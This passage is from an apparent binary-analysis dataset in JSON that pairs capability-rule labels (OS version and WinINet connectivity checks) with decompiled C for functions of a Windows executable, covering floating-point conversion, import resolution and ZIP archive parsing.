(*0x4517e4 & 0x1f);\n        if ((*puVar1 & 1 << (uVar8 & 0x1f)) != 0) {\n            uVar11 = (&var_10h)[iVar14] & ~(-1 << (uVar8 & 0x1f));\n            iVar7 = iVar14;\n            while( true ) {\n                if (uVar11 != 0) {\n                    iVar7 = iVar16 + (iVar16 >> 0x1f & 0x1fU) >> 5;\n                    uVar11 = 1 << (0x1f - (iVar16 & 0x1f) & 0x1f);\n                    puVar9 = &var_10h + iVar7;\n                    var_20h = *puVar9 + uVar11;\n                    if (var_20h < *puVar9) goto code_r0x0043c542;\n                    bVar17 = var_20h < uVar11;\n                    do {\n                        bVar6 = false;\n                        if (!bVar17) goto code_r0x0043c549;\ncode_r0x0043c542:\n                        do {\n                            bVar6 = true;\ncode_r0x0043c549:\n                            iVar7 = iVar7 + -1;\n                            *puVar9 = var_20h;\n                            if ((iVar7 < 0) || (!bVar6)) goto code_r0x0043c557;\n                            puVar9 = &var_10h + iVar7;\n                            var_20h = *puVar9 + 1;\n                        } while (var_20h < *puVar9);\n                        bVar17 = var_20h == 0;\n                    } while( true );\n                }\n                iVar7 = iVar7 + 1;\n                if (2 < iVar7) break;\n                uVar11 = (&var_10h)[iVar7];\n            }\n        }\ncode_r0x0043c557:\n        *puVar1 = *puVar1 & -1 << (uVar8 & 0x1f);\n        iVar14 = iVar14 + 1;\n        if (iVar14 < 3) {\n            puVar10 = &var_10h + iVar14;\n            for (iVar16 = 3 - iVar14; iVar16 != 0; iVar16 = iVar16 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n        }\n        iVar14 = iVar13;\n        if (bVar6) {\n            iVar14 = uVar12 - 0x3ffe;\n        }\n        if (iVar14 < *0x4517e0 - *0x4517e4) {\n            var_10h = 0;\n            var_ch = 0;\n            var_8h = 0;\n        }\n        else {\n            if (*0x4517e0 < iVar14) {\n                if (iVar14 < *0x4517dc) {\n                    iVar14 = iVar14 + *0x4517f0;\n                    var_10h = var_10h & 0x7fffffff;\n                    iVar13 = *0x4517e8 + (*0x4517e8 >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar5 & 0x1f;\n                    var_28h = 0;\n                    var_20h = 0;\n                    do {\n                        uVar15 = (&var_10h)[var_20h];\n                        (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                        var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        var_20h = var_20h + 1;\n                    } while (var_20h < 3);\n                    iVar16 = 2;\n                    puVar10 = &var_8h + -iVar13;\n                    do {\n                        if (iVar16 < iVar13) {\n                            (&var_10h)[iVar16] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar16] = *puVar10;\n                        }\n                        puVar10 = puVar10 + -1;\n                        iVar16 = iVar16 + -1;\n                    } while (-1 < iVar16);\n                }\n                else {\n                    var_ch = 0;\n                    var_8h = 0;\n                    var_10h = 0x80000000;\n                    iVar13 = *0x4517e8 + (*0x4517e8 >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar5 & 0x1f;\n                    var_28h = 0;\n                    var_20h = 0;\n                    do {\n                        uVar15 = (&var_10h)[var_20h];\n                        (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                        var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        var_20h = var_20h + 1;\n                    } while (var_20h < 3);\n                    iVar14 = 2;\n                    puVar10 = &var_8h + -iVar13;\n                    do {\n                        if (iVar14 < iVar13) {\n                            (&var_10h)[iVar14] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar14] = *puVar10;\n                        }\n                        puVar10 = puVar10 + -1;\n                        iVar14 = iVar14 + -1;\n                    } while (-1 < iVar14);\n                    iVar14 = *0x4517f0 + *0x4517dc;\n                }\n                goto code_r0x0043c902;\n            }\n            iVar13 = *0x4517e0 - iVar13;\n            var_10h = uVar15;\n            var_ch = uVar4;\n            iVar14 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = iVar13 & 0x1f;\n            var_8h = uVar3 << 0x10;\n            var_28h = 0;\n            var_20h = 0;\n            do {\n                uVar15 = (&var_10h)[var_20h];\n                (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                var_20h = var_20h + 1;\n            } while (var_20h < 3);\n            iVar13 = 2;\n            puVar10 = &var_8h + -iVar14;\n            do {\n                if (iVar13 < iVar14) {\n                    (&var_10h)[iVar13] = 0;\n                }\n                else {\n                    (&var_10h)[iVar13] = *puVar10;\n                }\n                puVar10 = puVar10 + -1;\n                iVar13 = iVar13 + -1;\n            } while (-1 < iVar13);\n            iVar14 = *0x4517e4 + -1;\n            iVar13 = *0x4517e4 + (*0x4517e4 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = 0x1f - (*0x4517e4 & 0x1f);\n            puVar1 = &var_10h + iVar13;\n            if ((*puVar1 & 1 << (uVar8 & 0x1f)) != 0) {\n                uVar15 = (&var_10h)[iVar13] & ~(-1 << (uVar8 & 0x1f));\n                iVar16 = iVar13;\n                while (uVar15 == 0) {\n                    iVar16 = iVar16 + 1;\n                    if (2 < iVar16) goto code_r0x0043c6f6;\n                    uVar15 = (&var_10h)[iVar16];\n                }\n                iVar16 = iVar14 + (iVar14 >> 0x1f & 0x1fU) >> 5;\n                bVar6 = false;\n                uVar12 = 1 << (0x1f - (iVar14 & 0x1f) & 0x1f);\n                uVar4 = (&var_10h)[iVar16];\n                uVar15 = uVar4 + uVar12;\n                if ((uVar15 < uVar4) || (uVar15 < uVar12)) {\n                    bVar6 = true;\n                }\n                (&var_10h)[iVar16] = uVar15;\n                while ((iVar16 = iVar16 + -1,  -1 < iVar16 && (bVar6))) {\n                    uVar4 = (&var_10h)[iVar16];\n                    uVar15 = uVar4 + 1;\n                    bVar6 = false;\n                    if ((uVar15 < uVar4) || (uVar15 == 0)) {\n                        bVar6 = true;\n                    }\n                    (&var_10h)[iVar16] = uVar15;\n                }\n            }\ncode_r0x0043c6f6:\n            *puVar1 = *puVar1 & -1 << (uVar8 & 0x1f);\n            iVar13 = iVar13 + 1;\n            if (iVar13 < 3) {\n                puVar10 = &var_10h + iVar13;\n                for (iVar14 = 3 - iVar13; iVar14 != 0; iVar14 = iVar14 + -1) {\n                    *puVar10 = 0;\n                    puVar10 = puVar10 + 1;\n                }\n            }\n            iVar13 = *0x4517e8 + 1 + (*0x4517e8 + 1 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = uVar5 + 1 & 0x1f;\n            var_28h = 0;\n            var_20h = 0;\n            do {\n                uVar15 = (&var_10h)[var_20h];\n                (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                var_20h = var_20h + 1;\n            } while (var_20h < 3);\n            iVar14 = 2;\n            puVar10 = &var_8h + -iVar13;\n            do {\n                if (iVar14 < iVar13) {\n                    (&var_10h)[iVar14] = 0;\n                }\n                else {\n                    (&var_10h)[iVar14] = *puVar10;\n                }\n                puVar10 = puVar10 + -1;\n                iVar14 = iVar14 + -1;\n            } while (-1 < iVar14);\n        }\n        iVar14 = 0;\n    }\ncode_r0x0043c902:\n    uVar15 = iVar14 << (0x1f - uVar5 & 0x1f) | -((uVar2 & 0x8000) != 0) & 0x80000000 | var_10h;\n    if (*0x4517ec == 0x40) {\n        arg_ch[1] = uVar15;\n        *arg_ch = var_ch;\n    }\n    else if (*0x4517ec == 0x20) {\n        *arg_ch = uVar15;\n    }\n    fcn.0042a75a(uVar2 & 0x8000);\n    return;\n}\n",
        "token_count": 3258
    },
    "00405530": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.00405530(void)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t *piVar5;\n    uint32_t *puVar6;\n    uint32_t *puVar7;\n    int32_t unaff_EDI;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((*(unaff_EDI + 0xc0) == 0) || (*(unaff_EDI + 0xc4) == 0)) {\n        return 0;\n    }\n    piVar5 = *(unaff_EDI + 0x144) + *(unaff_EDI + 0xc0);\n    iVar2 = piVar5[3];\n    if (iVar2 == 0) {\n        return iVar2;\n    }\n    do {\n        iVar2 = (**0x440024)(*(unaff_EDI + 0x144) + iVar2);\n        if (iVar2 == 0) {\n            return 6;\n        }\n        uVar4 = *(unaff_EDI + 0x154);\n        if (uVar4 <= *(unaff_EDI + 0x150)) {\n            if (uVar4 == 0) {\n                iVar3 = 0x10;\n            }\n            else {\n                iVar3 = uVar4 * 2;\n            }\n            *(unaff_EDI + 0x154) = iVar3;\n            var_ch = fcn.0042a769(iVar3 * 4);\n            if (var_ch == 0) {\n                return 3;\n            }\n            if (*(unaff_EDI + 0x150) != 0) {\n                fcn.0042a840(var_ch, *(unaff_EDI + 0x14c), *(unaff_EDI + 0x150) * 4);\n            }\n            fcn.0042a7fd(*(unaff_EDI + 0x14c));\n            *(unaff_EDI + 0x14c) = var_ch;\n        }\n        *(var_ch + *(unaff_EDI + 0x150) * 4) = iVar2;\n        *(unaff_EDI + 0x150) = *(unaff_EDI + 0x150) + 1;\n        puVar7 = piVar5[4] + *(unaff_EDI + 0x144);\n        puVar6 = puVar7;\n        if (piVar5[1] != 0) {\n            if (*piVar5 == 0) {\n                return 8;\n            }\n            puVar6 = *piVar5 + *(unaff_EDI + 0x144);\n        }\n        uVar4 = *puVar6;\n        while (uVar4 != 0) {\n            if (uVar4 < 0) {\n                uVar4 = uVar4 & 0xffff;\n            }\n            else {\n                uVar4 = uVar4 + 2 + *(unaff_EDI + 0x144);\n            }\n            uVar4 = (**0x440020)(iVar2, uVar4);\n            *puVar7 = uVar4;\n            if (uVar4 == 0) {\n                return 6;\n            }\n            puVar1 = puVar6 + 1;\n            puVar6 = puVar6 + 1;\n            puVar7 = puVar7 + 1;\n            uVar4 = *puVar1;\n        }\n        iVar2 = piVar5[8];\n        piVar5 = piVar5 + 5;\n        if (iVar2 == 0) {\n            return iVar2;\n        }\n    } while( true );\n}\n",
        "token_count": 820
    },
    "00405d40": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00405d40(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    uint arg_ch_00;\n    uint *in_ECX;\n    uint32_t arg_10h;\n    \n    if (arg_8h == 0xffffffff) {\n        fcn.00429b7e(0x4452ec);\n    }\n    uVar1 = in_ECX[5];\n    if (uVar1 < arg_8h) {\n        fcn.00405ba0(arg_8h, in_ECX[4]);\n        return arg_8h != 0;\n    }\n    if ((arg_ch != '\\0') && (arg_8h < 0x10)) {\n        arg_10h = in_ECX[4];\n        if (arg_8h < in_ECX[4]) {\n            arg_10h = arg_8h;\n        }\n        if (0xf < uVar1) {\n            arg_ch_00 = *in_ECX;\n            if (arg_10h != 0) {\n                fcn.0042a840(in_ECX, arg_ch_00, arg_10h);\n            }\n            fcn.0042a679(arg_ch_00);\n        }\n        in_ECX[4] = arg_10h;\n        in_ECX[5] = 0xf;\n        *(arg_10h + in_ECX) = 0;\n        return arg_8h != 0;\n    }\n    if (arg_8h == 0) {\n        in_ECX[4] = 0;\n        if (0xf < uVar1) {\n            in_ECX = *in_ECX;\n        }\n        *in_ECX = 0;\n    }\n    return arg_8h != 0;\n}\n",
        "token_count": 397
    },
    "00406dc0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00406dc0(uint arg_8h, int32_t *arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h)\n\n{\n    int32_t arg_2ch;\n    int32_t iVar1;\n    uint var_4h;\n    \n    var_4h = 0;\n    arg_2ch = (**(arg_18h + 0x20))(*(arg_18h + 0x28), 0x13, 4);\n    if (arg_2ch == 0) {\n        return -4;\n    }\n    iVar1 = fcn.00406880(arg_8h, 0x13, 0x13, 0, 0, arg_10h, arg_ch, arg_14h, &var_4h, arg_2ch);\n    if (iVar1 == -3) {\n        *(arg_18h + 0x18) = 0x446b1c;\n    }\n    else if ((iVar1 == -5) || (*arg_ch == 0)) {\n        *(arg_18h + 0x18) = 0x446af8;\n        iVar1 = -3;\n    }\n    (**(arg_18h + 0x24))(*(arg_18h + 0x28), arg_2ch);\n    return iVar1;\n}\n",
        "token_count": 307
    },
    "004076c0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004076c0(int32_t arg_8h)\n\n{\n    int32_t arg_8h_00;\n    \n    if (((arg_8h != 0) && (*(arg_8h + 0x1c) != 0)) && (*(arg_8h + 0x24) != 0)) {\n        arg_8h_00 = *(*(arg_8h + 0x1c) + 0x14);\n        if (arg_8h_00 != 0) {\n            fcn.004067e0(arg_8h_00, arg_8h);\n        }\n        (**(arg_8h + 0x24))(*(arg_8h + 0x28), *(arg_8h + 0x1c));\n        *(arg_8h + 0x1c) = 0;\n        return 0;\n    }\n    return 0xfffffffe;\n}\n",
        "token_count": 208
    },
    "004078e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004078e0(uint arg_8h, uint32_t arg_ch, int32_t arg_10h, char *arg_14h)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    uint32_t arg_10h_00;\n    \n    pcVar3 = arg_14h;\n    uVar2 = arg_ch;\n    arg_10h_00 = arg_ch * arg_10h;\n    if (*arg_14h != '\\0') {\n        iVar4 = (**0x462ff4)(*(arg_14h + 4), arg_8h, arg_10h_00, &arg_ch, 0);\n        if (iVar4 == 0) {\n            pcVar3[8] = '\\x01';\n        }\n        return arg_ch / uVar2;\n    }\n    iVar4 = *(arg_14h + 0x1c);\n    if (*(arg_14h + 0x18) < iVar4 + arg_10h_00) {\n        arg_10h_00 = *(arg_14h + 0x18) - iVar4;\n    }\n    fcn.0042a840(arg_8h, *(arg_14h + 0x14) + iVar4, arg_10h_00);\n    piVar1 = pcVar3 + 0x1c;\n    *piVar1 = *piVar1 + arg_10h_00;\n    return arg_10h_00 / uVar2;\n}\n",
        "token_count": 352
    },
    "00407960": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00407960(char *arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    iVar1 = fcn.004078e0(&var_1h, 1, 1, arg_8h);\n    if (iVar1 == 1) {\n        var_8h = var_1h;\ncode_r0x0040799e:\n        iVar1 = 0;\n    }\n    else {\n        if ((*arg_8h == '\\0') || (arg_8h[8] == '\\0')) goto code_r0x0040799e;\n        iVar1 = -1;\n    }\n    if (iVar1 != 0) {\ncode_r0x004079e1:\n        *arg_ch = 0;\n        return iVar1;\n    }\n    iVar1 = fcn.004078e0(&var_1h, 1, 1, arg_8h);\n    if (iVar1 == 1) {\n        uVar2 = var_1h;\n    }\n    else {\n        uVar2 = var_8h;\n        if ((*arg_8h != '\\0') && (arg_8h[8] != '\\0')) {\n            iVar1 = -1;\n            goto code_r0x004079e1;\n        }\n    }\n    *arg_ch = uVar2 * 0x100 + var_8h;\n    return 0;\n}\n",
        "token_count": 367
    },
    "00407a00": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00407a00(char *arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    iVar1 = fcn.004078e0(&var_1h, 1, 1, arg_8h);\n    if (iVar1 == 1) {\n        var_8h = var_1h;\ncode_r0x00407a3e:\n        iVar1 = 0;\n    }\n    else {\n        if ((*arg_8h == '\\0') || (arg_8h[8] == '\\0')) goto code_r0x00407a3e;\n        iVar1 = -1;\n    }\n    uVar4 = var_8h;\n    if (iVar1 == 0) {\n        iVar1 = fcn.004078e0(&var_1h, 1, 1, arg_8h);\n        if (iVar1 == 1) {\n            uVar4 = var_1h;\n        }\n        else if ((*arg_8h != '\\0') && (arg_8h[8] != '\\0')) {\n            iVar1 = -1;\n            goto code_r0x00407a62;\n        }\n        iVar1 = 0;\n    }\ncode_r0x00407a62:\n    iVar3 = uVar4 * 0x100;\n    if (iVar1 == 0) {\n        iVar1 = fcn.004078e0(&var_1h, 1, 1, arg_8h);\n        if (iVar1 == 1) {\n            uVar4 = var_1h;\n        }\n        else if ((*arg_8h != '\\0') && (arg_8h[8] != '\\0')) {\n            iVar1 = -1;\n            goto code_r0x00407a89;\n        }\n        iVar1 = 0;\n    }\ncode_r0x00407a89:\n    iVar2 = uVar4 * 0x10000;\n    if (iVar1 != 0) {\ncode_r0x00407aef:\n        *arg_ch = 0;\n        return iVar1;\n    }\n    iVar1 = fcn.004078e0(&var_1h, 1, 1, arg_8h);\n    if (iVar1 == 1) {\n        uVar4 = var_1h;\n    }\n    else if ((*arg_8h != '\\0') && (arg_8h[8] != '\\0')) {\n        iVar1 = -1;\n        goto code_r0x00407aef;\n    }\n    *arg_ch = uVar4 * 0x1000000 + var_8h + iVar3 + iVar2;\n    return 0;\n}\n",
        "token_count": 663
    },
    "00407b60": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00407b60(char *arg_8h)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint var_18h;\n    uint32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    pcVar2 = arg_8h;\n    if (*arg_8h == '\\0') {\n        *(arg_8h + 0x1c) = *(arg_8h + 0x18);\n    }\n    else {\n        if (arg_8h[1] == '\\0') {\n            return -1;\n        }\n        (**0x462ee8)(*(arg_8h + 4), 0, 0, 2);\n    }\n    if (*arg_8h == '\\0') {\n        arg_8h = *(arg_8h + 0x1c);\n    }\n    else if (arg_8h[1] == '\\0') {\n        arg_8h = NULL;\n    }\n    else {\n        iVar3 = (**0x462ee8)(*(arg_8h + 4), 0, 0, 1);\n        arg_8h = iVar3 - *(arg_8h + 0xc);\n    }\n    var_4h = 0xffff;\n    if (arg_8h < 0xffff) {\n        var_4h = arg_8h;\n    }\n    uVar6 = var_4h;\n    var_ch = fcn.0042a769(0x404);\n    if (var_ch == 0) {\n        return -1;\n    }\n    var_10h = -1;\n    uVar5 = 4;\n    if (uVar6 < 5) {\ncode_r0x00407d0d:\n        fcn.0042a7fd(var_ch);\n        return var_10h;\n    }\n    do {\n        var_8h = uVar6;\n        if (uVar5 + 0x400 <= uVar6) {\n            var_8h = uVar5 + 0x400;\n        }\n        iVar3 = arg_8h - var_8h;\n        uVar6 = arg_8h - iVar3;\n        if (0x404 < uVar6) {\n            uVar6 = 0x404;\n        }\n        if (*pcVar2 == '\\0') {\n            *(pcVar2 + 0x1c) = iVar3;\n        }\n        else {\n            if (pcVar2[1] == '\\0') goto code_r0x00407d0d;\n            (**0x462ee8)(*(pcVar2 + 4), *(pcVar2 + 0xc) + iVar3, 0, 0);\n        }\n        if (*pcVar2 == '\\0') {\n            iVar4 = *(pcVar2 + 0x1c);\n            uVar5 = uVar6;\n            if (*(pcVar2 + 0x18) < iVar4 + uVar6) {\n                uVar5 = *(pcVar2 + 0x18) - iVar4;\n            }\n            fcn.0042a840(var_ch, *(pcVar2 + 0x14) + iVar4, uVar5);\n            *(pcVar2 + 0x1c) = *(pcVar2 + 0x1c) + uVar5;\n        }\n        else {\n            iVar4 = (**0x462ff4)(*(pcVar2 + 4), var_ch, uVar6, &var_14h, 0);\n            uVar5 = var_14h;\n            if (iVar4 == 0) {\n                pcVar2[8] = '\\x01';\n            }\n        }\n        if (uVar5 / uVar6 != 1) goto code_r0x00407d0d;\n        iVar4 = uVar6 - 3;\n        do {\n            iVar1 = iVar4;\n            if (iVar1 < 0) goto code_r0x00407cfb;\n            iVar4 = iVar1 + -1;\n        } while ((((*(iVar4 + var_ch) != 'P') || (*(iVar1 + var_ch) != 'K')) || (*(iVar1 + 1 + var_ch) != '\\x05')) ||\n                (*(iVar1 + 2 + var_ch) != '\\x06'));\n        var_10h = iVar4 + iVar3;\ncode_r0x00407cfb:\n        if ((var_10h != 0) || (uVar5 = var_8h,  uVar6 = var_4h,  var_4h <= var_8h)) goto code_r0x00407d0d;\n    } while( true );\n}\n",
        "token_count": 1086
    },
    "00407d30": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.00407d30(char **arg_8h, uint *arg_ch, uint *arg_10h, int32_t arg_14h, uint32_t arg_18h, int32_t arg_1ch, \n            uint32_t arg_20h, int32_t arg_24h, uint32_t arg_28h)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint32_t arg_ch_00;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint32_t var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint32_t var_38h;\n    uint32_t var_34h;\n    uint32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    iVar3 = 0;\n    if (arg_8h == NULL) {\n        return -0x66;\n    }\n    pcVar1 = *arg_8h;\n    if (*pcVar1 == '\\0') {\n        *(pcVar1 + 0x1c) = arg_8h[5] + arg_8h[3];\ncode_r0x00407d74:\n        iVar2 = fcn.00407a00(*arg_8h, &var_4h);\n        if (iVar2 != 0) goto code_r0x00407d87;\n        if (var_4h != 0x2014b50) {\n            iVar3 = -0x67;\n        }\n    }\n    else {\n        if (pcVar1[1] != '\\0') {\n            (**0x462ee8)(*(pcVar1 + 4), arg_8h[5] + arg_8h[3] + *(pcVar1 + 0xc), 0, 0);\n            goto code_r0x00407d74;\n        }\ncode_r0x00407d87:\n        iVar3 = -1;\n    }\n    iVar2 = fcn.00407960(*arg_8h, &var_58h);\n    if (iVar2 != 0) {\n        iVar3 = -1;\n    }\n    iVar2 = fcn.00407960(*arg_8h, &var_54h);\n    if (iVar2 != 0) {\n        iVar3 = -1;\n    }\n    iVar2 = fcn.00407960(*arg_8h, &var_50h);\n    if (iVar2 != 0) {\n        iVar3 = -1;\n    }\n    iVar2 = fcn.00407960(*arg_8h, &var_4ch);\n    if (iVar2 != 0) {\n        iVar3 = -1;\n    }\n    iVar2 = fcn.00407a00(*arg_8h, &var_48h);\n    if (iVar2 != 0) {\n        iVar3 = -1;\n    }\n    var_14h = var_48h >> 0x10 & 0x1f;\n    var_ch = (var_48h >> 0x19) + 0x7bc;\n    var_10h = (var_48h >> 0x15 & 0xf) - 1;\n    var_18h = var_48h >> 0xb & 0x1f;\n    var_20h = (var_48h & 0x1f) * 2;\n    var_1ch = var_48h >> 5 & 0x3f;\n    iVar2 = fcn.00407a00(*arg_8h, &var_44h);\n    if (iVar2 != 0) {\n        iVar3 = -1;\n    }\n    iVar2 = fcn.00407a00(*arg_8h, &var_40h);\n    if (iVar2 != 0) {\n        iVar3 = -1;\n    }\n    iVar2 = fcn.00407a00(*arg_8h, &var_3ch);\n    if (iVar2 != 0) {\n        iVar3 = -1;\n    }\n    iVar2 = fcn.00407960(*arg_8h, &var_38h);\n    if (iVar2 != 0) {\n        iVar3 = -1;\n    }\n    iVar2 = fcn.00407960(*arg_8h, &var_34h);\n    if (iVar2 != 0) {\n        iVar3 = -1;\n    }\n    iVar2 = fcn.00407960(*arg_8h, &var_30h);\n    if (iVar2 != 0) {\n        iVar3 = -1;\n    }\n    iVar2 = fcn.00407960(*arg_8h, &var_2ch);\n    if (iVar2 != 0) {\n        iVar3 = -1;\n    }\n    iVar2 = fcn.00407960(*arg_8h, &var_28h);\n    if (iVar2 != 0) {\n        iVar3 = -1;\n    }\n    iVar2 = fcn.00407a00(*arg_8h, &var_24h);\n    if (iVar2 != 0) {\n        iVar3 = -1;\n    }\n    iVar2 = fcn.00407a00(*arg_8h, &var_8h);\n    if (iVar2 != 0) {\n        iVar3 = -1;\n    }\n    if (iVar3 == 0) {\n        if (arg_14h != 0) {\n            arg_ch_00 = arg_18h;\n            if (var_38h < arg_18h) {\n                *(var_38h + arg_14h) = 0;\n                arg_ch_00 = var_38h;\n            }\n            if (((var_38h != 0) && (arg_18h != 0)) &&\n               (iVar2 = fcn.004078e0(arg_14h, arg_ch_00, 1, *arg_8h),  iVar2 != 1)) {\n                iVar3 = -1;\n            }\n            var_38h = var_38h - arg_ch_00;\n            if (iVar3 != 0) goto code_r0x00407ff0;\n        }\n        if (arg_1ch != 0) {\n            var_4h = var_34h;\n            if (arg_20h <= var_34h) {\n                var_4h = arg_20h;\n            }\n            if (var_38h != 0) {\n                pcVar1 = *arg_8h;\n                if (*pcVar1 == '\\0') {\n                    *(pcVar1 + 0x1c) = *(pcVar1 + 0x1c) + var_38h;\n                    var_38h = 0;\n                }\n                else if (pcVar1[1] == '\\0') {\n                    iVar3 = -1;\n                }\n                else {\n                    (**0x462ee8)(*(pcVar1 + 4), var_38h, 0, 1);\n                    var_38h = 0;\n                }\n            }\n            if (((var_34h != 0) && (arg_20h != 0)) && (iVar2 = fcn.004078e0(arg_1ch, var_4h, 1, *arg_8h),  iVar2 != 1))\n            {\n                iVar3 = -1;\n            }\n            iVar2 = var_38h + (var_34h - var_4h);\n            goto code_r0x00407ff3;\n        }\n    }\ncode_r0x00407ff0:\n    iVar2 = var_38h + var_34h;\ncode_r0x00407ff3:\n    if (iVar3 == 0) {\n        if (arg_24h != 0) {\n            if (var_30h < arg_28h) {\n                *(var_30h + arg_24h) = 0;\n                var_4h = var_30h;\n            }\n            else {\n                var_4h = arg_28h;\n            }\n            if (iVar2 != 0) {\n                pcVar1 = *arg_8h;\n                if (*pcVar1 == '\\0') {\n                    *(pcVar1 + 0x1c) = *(pcVar1 + 0x1c) + iVar2;\n                }\n                else if (pcVar1[1] == '\\0') {\n                    iVar3 = -1;\n                }\n                else {\n                    (**0x462ee8)(*(pcVar1 + 4), iVar2, 0, 1);\n                }\n            }\n            if (((var_30h != 0) && (arg_28h != 0)) && (iVar2 = fcn.004078e0(arg_24h, var_4h, 1, *arg_8h),  iVar2 != 1))\n            {\n                return -1;\n            }\n            if (iVar3 != 0) {\n                return iVar3;\n            }\n        }\n        if (arg_ch != NULL) {\n            puVar4 = &var_58h;\n            for (iVar2 = 0x14; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *arg_ch = *puVar4;\n                puVar4 = puVar4 + 1;\n                arg_ch = arg_ch + 1;\n            }\n        }\n        if (arg_10h != NULL) {\n            *arg_10h = var_8h;\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 2215
    },
    "00408100": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
